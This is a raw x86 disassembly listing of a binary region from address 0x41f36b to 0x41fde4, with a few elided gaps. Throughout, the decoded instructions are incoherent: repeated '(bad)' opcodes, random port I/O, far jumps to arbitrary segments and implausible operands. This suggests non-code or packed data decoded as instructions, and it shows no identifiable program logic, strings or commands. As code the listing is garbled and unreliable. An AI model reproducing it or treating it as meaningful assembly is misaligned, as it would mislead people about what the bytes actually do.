  41f36b:	adc    BYTE PTR [ebx+0x1b864057],dh
  41f371:	out    0x9,al
  41f373:	xor    BYTE PTR [ecx-0x7c],al
  41f376:	pop    ss
  41f377:	pushf  
  41f378:	sbb    al,0xb6
  41f37a:	dec    esi
  41f37b:	jmp    0x9f1996cf
  41f380:	sti    
  41f381:	je     0x41f398
  41f383:	lods   al,BYTE PTR ds:[esi]
  41f384:	jecxz  0x41f368
  41f386:	dec    edx
  41f387:	arpl   WORD PTR [ebx*2+0x5467506b],sp
  41f38e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f38f:	std    
  41f390:	js     0x41f40a
  41f392:	xchg   ebx,eax
  41f393:	xchg   esi,eax
  41f394:	and    edx,DWORD PTR [ebp-0x36]
  41f397:	test   BYTE PTR [ebp-0x2138fcdc],0x38
  41f39e:	and    eax,DWORD PTR [edi*1-0x36a2f337]
  41f3a5:	retf   
  41f3a6:	test   DWORD PTR [esi],esi
  41f3a8:	sti    
  41f3a9:	and    cl,BYTE PTR [ecx+0xebe60bb]
  41f3af:	popf   
  41f3b0:	cmp    al,0xe9
  41f3b2:	in     eax,dx
  41f3b3:	leave  
  41f3b4:	imul   ebp,DWORD PTR [edx],0xf37bb325
  41f3ba:	(bad)  
  41f3bb:	push   cs
  41f3bc:	hlt    
  41f3bd:	push   es
  41f3be:	lahf   
  41f3bf:	xchg   esp,eax
  41f3c0:	mov    esp,ss
  41f3c2:	push   cs
  41f3c3:	div    BYTE PTR [edx]
  41f3c5:	pusha  
  41f3c6:	fxch   st(6)
  41f3c8:	out    dx,al
  41f3c9:	or     DWORD PTR [esi+0x39],0x7117f264
  41f3d0:	mov    dl,0x94
  41f3d2:	sbb    eax,DWORD PTR [ebp+0x42]
  41f3d5:	jge    0x41f397
  41f3d7:	mov    edx,0x8cd356fb
  41f3dc:	int3   
  41f3dd:	dec    ebp
  41f3de:	inc    ebp
  41f3df:	adc    BYTE PTR [edi-0x794a8f0],ah
  41f3e5:	rcr    ebp,1
  41f3e7:	enter  0x4c37,0xb
  41f3eb:	adc    BYTE PTR [ebp+0x39],ah
  41f3ee:	imul   ebp,DWORD PTR [ecx],0x17a7686c
  41f3f4:	pop    edx
  41f3f5:	mov    DWORD PTR [esi],edx
  41f3f7:	mov    dh,0xdd
  41f3f9:	in     eax,0x7e
  41f3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3fc:	sbb    eax,0x9034bbc5
  41f401:	jg     0x41f45d
  41f403:	(bad)  
  41f404:	popf   
  41f405:	std    
  41f406:	enter  0x3888,0xba
  41f40a:	cmp    ebp,esi
  41f40c:	add    eax,edx
  41f40e:	pop    ecx
  41f40f:	aam    0x75
  41f411:	icebp  
  41f412:	add    BYTE PTR [edi],ah
  41f414:	nop
  41f415:	xchg   ebx,eax
  41f416:	cmc    
  41f417:	gs ins DWORD PTR es:[edi],dx
  41f419:	int    0xff
  41f41b:	dec    ebp
  41f41c:	mov    edi,0xdcaa7fef
  41f421:	add    al,0x39
  41f423:	cmc    
  41f424:	mov    ds:0x1d01c5b1,al
  41f429:	imul   ecx,DWORD PTR [ebp-0x57],0x4f
  41f42d:	test   al,0x2b
  41f42f:	(bad)  
  41f430:	mov    ecx,0x1d212b7c
  41f435:	dec    DWORD PTR [ebp+0x173e74c7]
  41f43b:	scas   al,BYTE PTR es:[edi]
  41f43c:	jg     0x41f459
  41f43e:	or     DWORD PTR [ebx],edx
  41f440:	push   cs
  41f441:	in     al,dx
	...
  41f4b2:	add    BYTE PTR [eax],al
  41f4b4:	and    BYTE PTR [edx-0x35],ch
  41f4b7:	dec    ebx
  41f4b8:	retf   
  41f4b9:	jmp    0x41f45b
  41f4bb:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41f4be:	xchg   esp,eax
  41f4bf:	aad    0xcb
  41f4c1:	adc    DWORD PTR [esp+eax*1],ecx
  41f4c4:	ss push eax
  41f4c6:	add    DWORD PTR [eax],eax
  41f4c8:	test   BYTE PTR [eax],0x0
  41f4cb:	add    BYTE PTR [ecx+0x12],ch
  41f4ce:	push   ecx
  41f4cf:	ins    DWORD PTR es:[edi],dx
  41f4d0:	aas    
  41f4d1:	adc    al,0x67
  41f4d3:	leave  
  41f4d4:	sub    esi,esp
  41f4d6:	xor    BYTE PTR [edx-0x3],ah
  41f4d9:	stc    
  41f4da:	cmp    DWORD PTR [eax-0x62],ecx
  41f4dd:	call   0xb1ed:0x729768b2
  41f4e4:	xor    eax,esp
  41f4e6:	and    ah,dl
  41f4e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e9:	test   al,0xb9
  41f4eb:	mov    ecx,0xeb0cb0ee
  41f4f0:	fisubr WORD PTR [esi+0x66640eba]
  41f4f6:	lds    ebx,FWORD PTR [esp+eiz*8]
  41f4f9:	inc    edx
  41f4fa:	jns    0x41f4da
  41f4fc:	push   edx
  41f4fd:	jle    0x41f4b6
  41f4ff:	jb     0x41f4ff
  41f501:	push   edi
  41f502:	ja     0x41f4df
  41f504:	mov    esi,0x847a25a4
  41f509:	pop    ebx
  41f50a:	repz call 0xc8cc:0x925535fe
  41f512:	shl    BYTE PTR [eax],cl
  41f514:	xchg   ecx,eax
  41f515:	jmp    DWORD PTR [edx-0x2f]
  41f518:	and    dl,BYTE PTR ds:0xfd6f4449
  41f51e:	lock add al,0x91
  41f521:	mov    edx,0xb86a8f4d
  41f526:	(bad)  [edi]
  41f528:	ins    DWORD PTR es:[edi],dx
  41f529:	adc    BYTE PTR [ebp+0x2c83deae],dh
  41f52f:	enter  0x3e06,0xf
  41f533:	aad    0xd8
  41f535:	shr    DWORD PTR [eax+0x627027c6],1
  41f53b:	pop    ecx
  41f53c:	popf   
  41f53d:	inc    esi
  41f53e:	in     eax,0xdb
  41f540:	lds    edi,FWORD PTR [eax]
  41f542:	or     eax,0x8ad491d7
  41f547:	mov    bl,0x9e
  41f549:	xlat   BYTE PTR ds:[ebx]
  41f54a:	cli    
  41f54b:	xor    edi,DWORD PTR [edx-0x63f90fc4]
  41f551:	mov    ecx,0xa7133531
  41f556:	jl     0x41f559
  41f558:	push   es
  41f559:	inc    ecx
  41f55a:	mov    al,ds:0x7593c12a
  41f55f:	push   ss
  41f560:	inc    esp
  41f561:	xor    al,0x99
  41f563:	dec    esp
  41f564:	test   DWORD PTR [edx-0x2],0xb0a2d30d
  41f56b:	(bad)
  41f56e:	dec    edi
  41f56f:	or     edx,DWORD PTR [esi-0x7943d84c]
  41f575:	pop    ecx
  41f576:	push   edx
  41f577:	adc    bl,al
  41f579:	in     eax,0xb9
  41f57b:	(bad)  
  41f57c:	cmp    al,0x9a
  41f57e:	dec    esi
  41f57f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f580:	mov    al,ds:0xf082e93d
  41f585:	sub    esp,DWORD PTR ds:0xd154b7d
  41f58b:	dec    esp
  41f58c:	cwde   
  41f58d:	outs   dx,DWORD PTR ds:[esi]
  41f58e:	mov    fs,eax
  41f590:	pop    ecx
  41f591:	jl     0x41f559
  41f593:	neg    al
  41f595:	lods   eax,DWORD PTR ds:[esi]
  41f596:	bound  ebx,QWORD PTR [edi+0x38a032bb]
  41f59c:	dec    edi
  41f59d:	es jge 0x41f554
  41f5a0:	inc    esp
  41f5a1:	ins    BYTE PTR es:[edi],dx
  41f5a2:	mov    ah,0xf7
  41f5a4:	sbb    DWORD PTR [ecx+0x44],ebx
  41f5a7:	dec    ebx
  41f5a8:	psubusb mm6,QWORD PTR [eax-0x3a917bb7]
  41f5af:	je     0x41f566
  41f5b1:	(bad)  
  41f5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5b3:	dec    esp
  41f5b4:	lods   al,BYTE PTR ds:[esi]
  41f5b5:	aas    
  41f5b6:	and    esi,DWORD PTR [edx-0x179e74f8]
  41f5bc:	in     al,0x4a
  41f5be:	int    0x2d
  41f5c0:	pop    esp
  41f5c1:	jmp    0x41f5c6
	...
  41f632:	add    BYTE PTR [eax],al
  41f634:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41f63a:	cmc    
  41f63b:	cwde   
  41f63c:	and    eax,0x801e835
  41f641:	inc    ecx
  41f642:	xor    BYTE PTR [esp+ebp*1+0x51],ah
  41f646:	add    DWORD PTR [eax],eax
  41f648:	test   BYTE PTR [eax],0x0
  41f64b:	add    BYTE PTR [edi-0x2e6dbd43],ch
  41f651:	pop    ebp
  41f652:	popa   
  41f653:	stc    
  41f654:	cmp    al,0xa3
  41f656:	push   eax
  41f657:	or     ah,BYTE PTR [eax+esi*4+0x1260a551]
  41f65e:	cld    
  41f65f:	adc    al,BYTE PTR [eax+0x34ec5dfd]
  41f665:	xor    DWORD PTR [ecx+0x27ff5a51],edi
  41f66b:	stos   DWORD PTR es:[edi],eax
  41f66c:	fs jns 0x41f5fb
  41f66f:	cld    
  41f670:	js     0x41f638
  41f672:	sbb    al,0x27
  41f674:	je     0x41f6d6
  41f676:	mov    bl,0x50
  41f678:	push   ecx
  41f679:	scas   al,BYTE PTR es:[edi]
  41f67a:	inc    edi
  41f67b:	xor    DWORD PTR [ecx],edx
  41f67d:	cmp    BYTE PTR [eax+0x25],0x5d
  41f681:	fsub   QWORD PTR [eax]
  41f683:	inc    edx
  41f684:	into   
  41f685:	jae    0x41f61f
  41f687:	ja     0x41f646
  41f689:	bound  esp,QWORD PTR [edx+0x7a89fd7c]
  41f68f:	xor    ebx,DWORD PTR [ebp+0x5a]
  41f692:	adc    DWORD PTR ds:0xfee74111,esp
  41f698:	sub    esp,DWORD PTR [edi-0xf9e27a]
  41f69e:	mov    bl,0x5e
  41f6a0:	lds    ecx,FWORD PTR [edx-0x22ba5f6a]
  41f6a6:	sub    eax,0xd1c6576e
  41f6ab:	sbb    edi,DWORD PTR [esi+eiz*1+0x2f]
  41f6af:	pop    esp
  41f6b0:	pop    eax
  41f6b1:	cmp    al,0xf8
  41f6b3:	inc    ebp
  41f6b4:	dec    ebp
  41f6b5:	fwait
  41f6b6:	sub    eax,0x116784a0
  41f6bb:	(bad)  [ebp+0x48630e6f]
  41f6c1:	into   
  41f6c2:	pop    ss
  41f6c3:	dec    ecx
  41f6c4:	lahf   
  41f6c5:	jmp    0xa76811af
  41f6ca:	test   cl,cl
  41f6cc:	inc    edi
  41f6cd:	inc    ecx
  41f6ce:	cmp    eax,0x713bfba4
  41f6d3:	cmp    DWORD PTR fs:[eax],ecx
  41f6d6:	mov    cl,0x6e
  41f6d8:	mov    esi,0x2d641a0b
  41f6dd:	adc    ecx,DWORD PTR [ebx-0x230600e2]
  41f6e3:	bound  edx,QWORD PTR [eax+0x58]
  41f6e6:	das    
  41f6e7:	or     esp,eax
  41f6e9:	outs   dx,BYTE PTR ds:[esi]
  41f6ea:	xor    DWORD PTR [ecx+eiz*4],edi
  41f6ed:	cmp    al,0x9a
  41f6ef:	shl    DWORD PTR [ebx],0x12
  41f6f2:	sti    
  41f6f3:	jne    0x41f736
  41f6f5:	push   0xd9838806
  41f6fa:	jmp    0x41f6e0
  41f6fc:	and    al,0x3d
  41f6fe:	(bad)  
  41f6ff:	and    ah,BYTE PTR [ecx+0x5b]
  41f702:	pop    es
  41f703:	mov    edx,0x38b76925
  41f708:	fwait
  41f709:	jo     0x41f726
  41f70b:	push   ds
  41f70c:	arpl   si,di
  41f70e:	add    DWORD PTR [edi-0x5a],0x580e7869
  41f715:	lock dec ebx
  41f717:	mov    ebx,DWORD PTR [esp+esi*4-0x42f58696]
  41f71e:	cdq    
  41f71f:	or     DWORD PTR [ebp+0x5445c0db],ecx
  41f725:	ins    DWORD PTR es:[edi],dx
  41f726:	imul   ebx,DWORD PTR [ebx+edi*4+0x8],0x14a601a4
  41f72e:	adc    ah,ch
  41f730:	sbb    BYTE PTR [ebp-0x4c],al
  41f733:	sbb    esi,DWORD PTR [edi+0x4e]
  41f736:	js     0x41f78c
  41f738:	pop    es
  41f739:	jae    0x41f718
  41f73b:	adc    dh,al
  41f73d:	jnp    0x41f79d
  41f73f:	inc    eax
  41f740:	inc    edi
  41f741:	and    al,0x0
	...
  41f7b3:	add    BYTE PTR ds:0x9e5c8a39,ch
  41f7b9:	(bad)  
  41f7ba:	(bad)  
  41f7bb:	jns    0x41f77e
  41f7bd:	clc    
  41f7be:	mov    ah,0x9e
  41f7c0:	sbb    dh,BYTE PTR [edi]
  41f7c2:	jae    0x41f78a
  41f7c4:	and    dl,BYTE PTR [edx+0x1]
  41f7c7:	add    dh,dh
  41f7c9:	add    BYTE PTR [eax],al
  41f7cb:	add    BYTE PTR [ecx],ah
  41f7cd:	ret    
  41f7ce:	addr16 inc esi
  41f7d0:	mov    WORD PTR [esi],es
  41f7d2:	loope  0x41f832
  41f7d4:	into   
  41f7d5:	xor    eax,0xe9a5ff30
  41f7da:	mov    dh,0x5a
  41f7dc:	mov    ecx,0x4c03c6c
  41f7e1:	loopne 0x41f7b5
  41f7e3:	aad    0xca
  41f7e5:	ja     0x41f827
  41f7e7:	mov    ds:0xb3909086,al
  41f7ec:	je     0x41f7f9
  41f7ee:	test   DWORD PTR [ebx],ebp
  41f7f0:	adc    al,0xd4
  41f7f2:	push   eax
  41f7f3:	lds    esp,FWORD PTR [eax]
  41f7f5:	or     cl,BYTE PTR [edx]
  41f7f7:	or     esp,0xffffffa7
  41f7fa:	scas   eax,DWORD PTR es:[edi]
  41f7fb:	leave  
  41f7fc:	mov    al,ds:0xd7c12899
  41f801:	ins    DWORD PTR es:[edi],dx
  41f802:	xchg   esi,eax
  41f803:	cli    
  41f804:	fisub  DWORD PTR [eax-0x8]
  41f807:	cld    
  41f808:	mov    esi,0x39dfeb3b
  41f80d:	jmp    0xaa6b:0x72d35ff4
  41f814:	fild   WORD PTR [edi+0x1b572c34]
  41f81a:	in     al,dx
  41f81b:	and    eax,0xca491f9e
  41f820:	dec    esi
  41f821:	mov    ebp,0x5f740f74
  41f826:	xchg   ecx,eax
  41f827:	lock jge 0x41f804
  41f82a:	pop    edi
  41f82b:	pavgb  mm0,mm3
  41f82e:	adc    edi,DWORD PTR [esp+eiz*2]
  41f831:	add    DWORD PTR [esi+0x4c],0xffffff97
  41f835:	popa   
  41f836:	add    al,0xe1
  41f838:	sbb    DWORD PTR [edx-0x55],esp
  41f83b:	jno    0x41f7d7
  41f83d:	xchg   BYTE PTR ds:0x8ceb9fcd,ah
  41f843:	repnz xor eax,0xed46ffd
  41f849:	pop    ebp
  41f84a:	enter  0x6b9a,0xc8
  41f84e:	or     al,0x83
  41f850:	cwde   
  41f851:	cdq    
  41f852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f853:	test   eax,0xfd52b182
  41f858:	xchg   ecx,eax
  41f859:	mov    dl,0x97
  41f85b:	mov    dl,BYTE PTR [ebx-0x79]
  41f85e:	xchg   BYTE PTR [ecx+edi*8],bl
  41f861:	mov    ebx,esi
  41f863:	mov    esi,0x5b42360b
  41f868:	push   cs
  41f869:	outs   dx,BYTE PTR ds:[esi]
  41f86a:	adc    BYTE PTR [ebp+0x2f97ad36],cl
  41f870:	xor    esi,DWORD PTR [edx-0x43]
  41f873:	mov    al,BYTE PTR [eax-0x12]
  41f876:	das    
  41f877:	jp     0x41f7ff
  41f879:	pop    ss
  41f87a:	and    DWORD PTR [ebp-0x6ac56532],eax
  41f880:	and    BYTE PTR [ebp-0x28],ah
  41f883:	mov    ds:0x90e7ef4,eax
  41f888:	xor    bh,ch
  41f88a:	pop    ss
  41f88b:	push   0xdf52201c
  41f890:	pop    ebp
  41f891:	imul   ebx,DWORD PTR [ebx+0x60],0x11
  41f895:	adc    eax,0x4a5c72a
  41f89a:	rcl    BYTE PTR [ebx-0x15],1
  41f89d:	fild   WORD PTR [ecx-0x45]
  41f8a0:	std    
  41f8a1:	lea    ecx,[edx-0x7614894c]
  41f8a7:	and    eax,0x5d9e25f4
  41f8ac:	scas   al,BYTE PTR es:[edi]
  41f8ad:	imul   ebx,DWORD PTR [edx+0x51fcedb],0xe2f27979
  41f8b7:	js     0x41f8d9
  41f8b9:	or     BYTE PTR [edx+edx*4+0x67355507],0xd7
  41f8c1:	jecxz  0x41f8c3
	...
  41f933:	add    BYTE PTR [eax-0x3],bh
  41f936:	ret    0xc766
  41f939:	jg     0x41f937
  41f93b:	(bad)  
  41f93c:	mov    ecx,0xfb9ffef7
  41f941:	sub    al,0xf2
  41f943:	(bad)  
  41f944:	sbb    BYTE PTR [ebx+0x1],dl
  41f947:	add    dh,dh
  41f949:	add    BYTE PTR [eax],al
  41f94b:	add    BYTE PTR [ecx],ah
  41f94d:	dec    edi
  41f94e:	and    esp,edx
  41f950:	leave  
  41f951:	ret    0x9b39
  41f954:	ret    0x19b9
  41f957:	mov    eax,DWORD PTR cs:[edx+0x56]
  41f95b:	sti    
  41f95c:	pop    ebx
  41f95d:	jmp    esi
  41f95f:	push   esi
  41f960:	push   edi
  41f961:	rcr    edx,cl
  41f963:	rcl    ah,1
  41f965:	xor    ch,BYTE PTR [eax+eiz*1-0x38305245]
  41f96c:	test   BYTE PTR [edi],cl
  41f96e:	stos   BYTE PTR es:[edi],al
  41f96f:	hlt    
  41f970:	push   0x5a07b0d7
  41f975:	lock mov WORD PTR [ecx+edi*4-0x5b],cs
  41f97a:	push   ecx
  41f97b:	push   edi
  41f97c:	xor    eax,0x23432c6e
  41f981:	cs mov ch,0xa6
  41f984:	pushf  
  41f985:	mov    WORD PTR [ebx],?
  41f987:	fild   DWORD PTR [edx-0x4025d770]
  41f98d:	mov    ecx,0x5cfb209f
  41f992:	jl     0x41f962
  41f994:	adc    eax,0x8388fa4
  41f999:	jl     0x41fa11
  41f99b:	pop    esp
  41f99c:	lods   al,BYTE PTR ds:[esi]
  41f99d:	or     eax,0x1dbb8041
  41f9a2:	mov    ah,0x64
  41f9a4:	pushf  
  41f9a5:	sub    BYTE PTR [edi],cl
  41f9a7:	std    
  41f9a8:	mov    bl,0x7b
  41f9aa:	lods   al,BYTE PTR ds:[esi]
  41f9ab:	jne    0x41f9d8
  41f9ad:	sub    al,0x7f
  41f9af:	inc    ecx
  41f9b0:	dec    ecx
  41f9b1:	xchg   edi,eax
  41f9b2:	mov    al,BYTE PTR [edi+0x2647a82]
  41f9b8:	mov    dl,0x36
  41f9ba:	out    dx,al
  41f9bb:	inc    edx
  41f9bc:	xchg   edx,eax
  41f9bd:	mov    ecx,0xfc50ecd5
  41f9c2:	pop    ss
  41f9c3:	fidivr DWORD PTR [ecx+edx*2-0x348bd8ba]
  41f9ca:	ret    
  41f9cb:	popa   
  41f9cc:	push   esp
  41f9cd:	mov    al,0x4b
  41f9cf:	popf   
  41f9d0:	push   esp
  41f9d1:	stos   BYTE PTR es:[edi],al
  41f9d2:	push   0xffffffa7
  41f9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9d5:	cmp    al,0x56
  41f9d7:	xchg   ecx,eax
  41f9d8:	and    eax,0x886aa6fc
  41f9dd:	pop    es
  41f9de:	sbb    DWORD PTR [ebp+0x3e],0x3bf12b4f
  41f9e5:	mov    ah,0x6c
  41f9e7:	jge    0x41f991
  41f9e9:	mov    WORD PTR [edi+esi*4-0xb958efe],fs
  41f9f0:	or     ah,BYTE PTR [ecx]
  41f9f2:	mov    al,ds:0x31208762
  41f9f7:	inc    ebx
  41f9f8:	popf   
  41f9f9:	in     al,0xe2
  41f9fb:	sub    eax,0xd8daa2f8
  41fa00:	mov    ecx,0x919ddd45
  41fa05:	push   0xffffff91
  41fa07:	mov    fs,esi
  41fa09:	(bad)  
  41fa0a:	mov    eax,ds:0x3be7e083
  41fa0f:	sar    bh,cl
  41fa11:	inc    ecx
  41fa12:	out    0x2e,eax
  41fa14:	adc    BYTE PTR ds:0x81dd7784,ch
  41fa1a:	cmc    
  41fa1b:	jmp    0x56f5:0xce785340
  41fa22:	imul   esi,DWORD PTR [ecx],0xf0c95e01
  41fa28:	int    0xf3
  41fa2a:	pop    edx
  41fa2b:	or     edi,DWORD PTR [eax+0x4b]
  41fa2e:	mov    ch,0x21
  41fa30:	xor    DWORD PTR [eax+0x1c],esi
  41fa33:	scas   eax,DWORD PTR es:[edi]
  41fa34:	adc    DWORD PTR [ebx+0x23],edx
  41fa37:	sbb    DWORD PTR [eax+0x6f9530e6],esp
  41fa3d:	push   cs
  41fa3e:	jbe    0x41fab2
  41fa40:	sub    eax,0x61
	...
  41fab1:	add    BYTE PTR [eax],al
  41fab3:	add    BYTE PTR [edx],dl
  41fab5:	das    
  41fab6:	mov    esi,DWORD PTR [edi+edi*4+0x4eaf3fb4]
  41fabd:	cwde   
  41fabe:	out    dx,eax
  41fabf:	daa    
  41fac0:	adc    eax,0xef607f2
  41fac5:	push   esp
  41fac6:	add    DWORD PTR [eax],eax
  41fac8:	test   BYTE PTR [eax],0x0
  41facb:	add    BYTE PTR [edi],ah
  41facd:	fist   DWORD PTR [ecx+ebx*2]
  41fad0:	icebp  
  41fad1:	mov    bl,0x10
  41fad3:	jge    0x41fb27
  41fad5:	xchg   DWORD PTR [edi],esp
  41fad7:	lds    ecx,FWORD PTR [ecx]
  41fad9:	jns    0x41fb4c
  41fadb:	mov    al,0xd4
  41fadd:	clc    
  41fade:	out    dx,al
  41fadf:	pop    esp
  41fae0:	jecxz  0x41fa7c
  41fae2:	push   0x9a31c41
  41fae7:	cmp    al,0x41
  41fae9:	call   0x9fb42849
  41faee:	cwde   
  41faef:	dec    esp
  41faf0:	xchg   DWORD PTR [edx-0x3d91cab3],ecx
  41faf6:	neg    BYTE PTR [ebx+0x6]
  41faf9:	sti    
  41fafa:	cmp    eax,0xa469999f
  41faff:	out    0xaf,eax
  41fb01:	mov    ds:0xdb66e42a,eax
  41fb06:	mov    bl,0x52
  41fb08:	pop    ebp
  41fb09:	ins    BYTE PTR es:[edi],dx
  41fb0a:	mov    al,0x5d
  41fb0c:	aam    0xe
  41fb0e:	mov    ds:0xa8c18e38,al
  41fb13:	cdq    
  41fb14:	add    BYTE PTR [ebx],ch
  41fb16:	mov    ah,0x3a
  41fb18:	fmul   DWORD PTR [esi+eax*1]
  41fb1b:	xchg   edi,eax
  41fb1c:	lahf   
  41fb1d:	ret    
  41fb1e:	fstp   QWORD PTR [ebx+edx*2]
  41fb21:	jl     0x41fb1d
  41fb23:	aaa    
  41fb24:	pop    esp
  41fb25:	add    DWORD PTR [ebx-0x5c8eac90],ecx
  41fb2b:	push   ds
  41fb2c:	(bad)  
  41fb2d:	pop    ebp
  41fb2e:	dec    ecx
  41fb2f:	dec    eax
  41fb30:	pop    DWORD PTR [ebx+0x427b240f]
  41fb36:	mov    ch,0x58
  41fb38:	xchg   ah,ah
  41fb3a:	das    
  41fb3b:	repnz pop es
  41fb3d:	sub    BYTE PTR [ecx+0x16],bh
  41fb40:	push   es
  41fb41:	in     eax,dx
  41fb42:	loope  0x41fb99
  41fb44:	enter  0xe380,0x6c
  41fb48:	adc    cl,BYTE PTR [edx+eax*8-0x59]
  41fb4c:	mov    bl,0x57
  41fb4e:	or     dh,dl
  41fb50:	ret    0xb20a
  41fb53:	pop    ds
  41fb54:	and    BYTE PTR [ecx],0xfd
  41fb57:	xor    eax,esp
  41fb59:	popf   
  41fb5a:	mov    bl,0x9a
  41fb5c:	ds mov dh,0x75
  41fb5f:	or     bh,ch
  41fb61:	(bad)  
  41fb63:	rcr    DWORD PTR [edi+0x6],cl
  41fb66:	or     bl,cl
  41fb68:	leave  
  41fb69:	imul   esp,DWORD PTR [eax+0x7c1ca67e],0x808635c
  41fb73:	frstpm(287 only) 
  41fb75:	xor    dl,ch
  41fb77:	cmp    esi,ebp
  41fb79:	and    eax,0xb4a9f5a0
  41fb7e:	(bad)  
  41fb7f:	fmul   DWORD PTR [ebx+0x3f3fd3fd]
  41fb85:	mov    dl,0xd
  41fb87:	loope  0x41fb6f
  41fb89:	fsubrp st(6),st
  41fb8b:	xor    eax,0x5036480a
  41fb90:	jo     0x41fb25
  41fb92:	out    0x6f,eax
  41fb94:	push   esi
  41fb95:	mov    ds:0x90d2bb9a,eax
  41fb9a:	repnz sub DWORD PTR [edx+0x48],0x34
  41fb9f:	push   esp
  41fba0:	dec    edx
  41fba1:	popf   
  41fba2:	pop    ecx
  41fba3:	mov    eax,0xba28ed06
  41fba8:	cmc    
  41fba9:	data16 fstp st(2)
  41fbac:	enter  0xa01f,0xac
  41fbb0:	shl    BYTE PTR [ebx-0x4e],1
  41fbb3:	dec    esi
  41fbb4:	inc    eax
  41fbb5:	shl    DWORD PTR [edi+ecx*4-0x8],0xff
  41fbba:	out    dx,al
  41fbbb:	sahf   
  41fbbc:	popa   
  41fbbd:	mov    ds:0x2565c2b6,al
	...
  41fc32:	add    BYTE PTR [eax],al
  41fc34:	inc    ecx
  41fc35:	icebp  
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0x5d718ad2
  41fc42:	xor    dh,BYTE PTR [ecx+0x4]
  41fc45:	push   ebp
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	test   BYTE PTR [eax],0x0
  41fc4b:	add    BYTE PTR [edi+0x6],ch
  41fc4e:	xor    eax,DWORD PTR [ecx+0x2e]
  41fc51:	rcl    DWORD PTR [ecx-0x563dafbb],cl
  41fc57:	mov    al,0xb
  41fc59:	iret   
  41fc5a:	mov    eax,0x4cee8ff7
  41fc5f:	jo     0x41fcd0
  41fc61:	add    eax,0xaae34ce4
  41fc66:	xchg   edi,eax
  41fc67:	das    
  41fc68:	sbb    eax,ebp
  41fc6a:	jmp    0xd307b5f1
  41fc6f:	sahf   
  41fc70:	sub    bh,dh
  41fc72:	sbb    BYTE PTR [ebp-0x6358e86b],dl
  41fc78:	push   ebp
  41fc79:	int3   
  41fc7a:	cld    
  41fc7b:	lds    esi,FWORD PTR [ecx]
  41fc7d:	cmp    ebx,DWORD PTR [ebx-0x12]
  41fc80:	jp     0x41fce3
  41fc82:	test   DWORD PTR [eax],ebp
  41fc84:	push   ds
  41fc85:	(bad)  
  41fc86:	jae    0x41fcb0
  41fc88:	cs loop 0x41fcb0
  41fc8b:	dec    ecx
  41fc8c:	mov    edx,0x52920fbf
  41fc91:	add    eax,0xdb563c1
  41fc96:	sub    ebx,esp
  41fc98:	cmp    DWORD PTR [bx+0x16],ecx
  41fc9c:	clc    
  41fc9d:	xor    ch,BYTE PTR [esi-0xd]
  41fca0:	or     BYTE PTR [ecx-0xb],ch
  41fca3:	dec    eax
  41fca4:	dec    edi
  41fca5:	popw   ds
  41fca7:	pop    edi
  41fca8:	push   ebp
  41fca9:	std    
  41fcaa:	hlt    
  41fcab:	and    eax,0x652c8443
  41fcb0:	pop    esi
  41fcb1:	cs popa 
  41fcb3:	add    al,0x41
  41fcb5:	pop    ebp
  41fcb6:	cmp    DWORD PTR [ebp-0xf4fec1d],0xb6e55169
  41fcc0:	xor    al,0x88
  41fcc2:	clc    
  41fcc3:	fidivr DWORD PTR [esi-0x633cbd1]
  41fcc9:	mov    esp,0xa05ebfac
  41fcce:	bound  ecx,QWORD PTR [edx-0x4f17f90e]
  41fcd4:	popf   
  41fcd5:	jp     0x41fd37
  41fcd7:	stos   DWORD PTR es:[edi],eax
  41fcd8:	dec    ebp
  41fcd9:	jb     0x41fd4a
  41fcdb:	cmp    BYTE PTR [ebx],ah
  41fcdd:	inc    edi
  41fcde:	fimul  WORD PTR [edi-0x900d4e6]
  41fce4:	arpl   WORD PTR [ebx+0x449c4370],cx
  41fcea:	shr    BYTE PTR [ebx+0x45a6ca93],0x8e
  41fcf1:	push   ecx
  41fcf2:	mov    esp,0x837534b5
  41fcf7:	or     esi,ecx
  41fcf9:	js     0x41fd6f
  41fcfb:	retf   0x883
  41fcfe:	cmp    al,0xf
  41fd00:	cmp    DWORD PTR [esi+0x5c],edx
  41fd03:	ins    DWORD PTR es:[edi],dx
  41fd04:	or     ah,BYTE PTR [ebp+0x32]
  41fd07:	enter  0xfcd4,0xf4
  41fd0b:	aad    0x54
  41fd0d:	sar    edx,0x3c
  41fd10:	xor    DWORD PTR [ebx+0x17180563],ecx
  41fd16:	inc    edi
  41fd17:	xchg   edx,eax
  41fd18:	sub    DWORD PTR [ebx],edx
  41fd1a:	jnp    0x41fce1
  41fd1c:	adc    BYTE PTR [eax+0x20],cl
  41fd1f:	sub    BYTE PTR [ebx],0xa2
  41fd22:	sub    dl,bh
  41fd24:	repnz cmp al,0x2
  41fd27:	inc    edi
  41fd28:	pop    edi
  41fd29:	fnstcw WORD PTR [ebx-0x302d2d6d]
  41fd2f:	les    ecx,FWORD PTR [ebx+edi*8+0x688f046e]
  41fd36:	and    al,0x7c
  41fd38:	xchg   ebp,eax
  41fd39:	xor    esi,DWORD PTR [esi-0x5e]
  41fd3c:	adc    dl,bh
  41fd3e:	out    0x6f,al
  41fd40:	cli    
  41fd41:	push   ebx
	...
  41fdb2:	add    BYTE PTR [eax],al
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	in     eax,dx
  41fdc1:	bnd ret 0xfa1c
  41fdc5:	push   ebp
  41fdc6:	add    DWORD PTR [eax],eax
  41fdc8:	test   BYTE PTR [eax],0x0
  41fdcb:	add    bh,ch
  41fdcd:	repz retf 0x55b1
  41fdd1:	fsub   st(7),st
  41fdd3:	jl     0x41fe35
  41fdd5:	jns    0x41fda9
  41fdd7:	pop    DWORD PTR [esi-0x37843de5]
  41fddd:	pop    ebp
  41fdde:	dec    esi
  41fddf:	shl    BYTE PTR [edx-0x36],0x13
  41fde3:	dec    edx
  41fde4:	rol    BYTE PTR [edi-0x60],1
